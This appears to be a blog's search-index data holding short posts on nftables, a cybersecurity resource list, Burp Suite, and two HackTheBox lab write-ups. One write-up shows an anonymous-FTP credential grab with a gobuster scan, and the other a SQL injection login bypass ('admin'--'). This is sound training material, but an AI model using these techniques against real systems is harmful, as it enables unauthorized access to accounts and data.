This means that if no chain uses any types or hooks in the netfilter framework, packets that would flow through those chains will not be touched by nftables, unlike iptables.Chains have two types. A base chain is an entry point for packets from the networking stack, where a hook value is specified. A regular chain may be used as a jump target for better organization.RulesRules are either constructed from expressions or statements and are contained within chains.SetsSets are named or anonymous, and consist of one or more elements, separated by commas, enclosed by curly braces. Anonymous sets are embedded in rules and cannot be updated, you must delete and re-add the rule.ResourcesGeneral Informationnftables wikiConfigure ChainsIP Filter Based Firewalls HOWTOGetting started with nftablesQuick nftables referencesSpecific informationKernel informationConnection trackingPort Knocking examplenftables hardening rules and good practices" }, { "title": "00 - Crocodile", "url": "/posts/Crocodile_00/", "categories": "Writeups, HTB, Very_Easy, Crocodile", "tags": "php, ftp", "date": "2022-08-20 00:00:00 +0200", "snippet": "Intro| Dificulty | OS | Start Date | End Date | |—|—|—|—|| Very Easy | Linux | 17/05/2022 | 17/05/2022 |Thought process View running services with nmap. Connect with ftp(Anonymous User). List Directories and get interesting files. (Usernames+Password File) Dirbust @IP to find if there’s any login.php. Login as “admin”.ResolutionAfter checking which ports are open, I make an ftp connection using “anonymous” username.$ ftp @IPI listed the Directories ls and downloaded the username and password files get.[lcd]: Change directory on your local system.The web didn’t display any LogIn so I dirbust trying to find any .php$ gobuster dir -u @IP/Domain -w /path/to/wordlist -x phpIn the end it found a file called login.php so I typed it in the browser. Once there, I tried with the user “admin” which was in the files.OthersUsers could connect to the FTP server anonymously if the server is configured to allow it, meaning that we could use it even if we had no valid credentials. (nmap shows if it’s possible)." }, { "title": "Cheat Sheet Resources", "url": "/posts/CheatSheet_Resources/", "categories": "Cheatsheet, Personal", "tags": "resources", "date": "2022-08-20 00:00:00 +0200", "snippet": "ResourcesA collection of links, notes, programs, websites, etc. related to CTFs and cybersecurity.CheatSheet nmap netcat smbclient Gobuster Brup SuiteTraining Sites HackTheBox TryHackMe Vulnhub picoCTFArticles GTFOBins - Possible privilege escalation vectors through SUID/GUID binaries. Hacksplaining - Basics of hacking with interactive examples. BackDoorShell.gitbooks - OSCP Useful LinksWalkthroughs and Writeups ippsec Web - Searcheable directory with HackTheBox Walkthrougs. snowscan - HTB writeups S4vitaar - Spanish Twitch streamer afiliated to HackTheBoxOthers Resources I Resources II" }, { "title": "Burp Suite", "url": "/posts/Burp_suite/", "categories": "Cheatsheet, Web", "tags": "Burp_suite", "date": "2022-08-20 00:00:00 +0200", "snippet": "Burp SuiteSecurity testing application that can be used to perform web requests on webapplications, mobile apps, and thick clients. Burp offers multiple capabilities such as web crawler, scanner, proxy, repeater, intruder and many more. More Information LinkToolsSpiderUsed to map the target web application. The objective of the mapping is to get a list of endpoints so that their functionality can be observed and potential vulnerabilities can be found.A web crawler (also known as a web spider or web robot) is a program or automated script which browses the World Wide Web in a methodical, automated manner. This process is called Web crawling or spidering. Many legitimate sites, in particular search engines, use spidering as a means of providing up-to-date data.ProxyIntercepting proxy that lets the user see and modify the contents of requests and responses while they are in transit. The proxy server can be adjusted to run on a specific loop-back ip and a port.IntruderIt is a fuzzer. This is used to run a set of values through an input point. The values are run and the output is observed for success/failure and content length.The intruder is used for: Brute-force attacks on password forms, pin forms, and other such forms. The dictionary attack on password forms, fields that are suspected of being vulnerable to XSS or SQL injection. Testing and attacking rate limiting on the web-app.RepeaterLets a user send requests repeatedly with manual modifications.The Repeater is used for: Verifying whether the user-supplied values are being verified. If user-supplied values are being verified, how well is it being done? What values is the server expecting in an input parameter/request header? [More]" }, { "title": "00 - Appointment", "url": "/posts/Appointment_00/", "categories": "Writeups, HTB, Very_Easy, Appointment", "tags": "SQL_Injection", "date": "2022-08-20 00:00:00 +0200", "snippet": "Intro| Dificulty | OS | Start Date | End Date ||—|—|—|—|| Very Easy | Linux | 10/05/2022 | 10/05/2022 |Thought process View running services with nmap. Check if there were subdirectories with the dirbust. Since it was a LogIn, see if SQL Injection can be done.ResolutionTo Login a Web is just a SELECT to the database, but if in the username you write admin’– the rest of the query is commented out and does not look for a password. SQL Injection. Normal Login Query SELECT * FROM users WHERE name='admin' and password='123456aA' Query with SQL Injection SELECT * FROM members WHERE username = 'admin'--' AND password = '123456aA' LinksSQL Injection Cheat Sheet" } ]
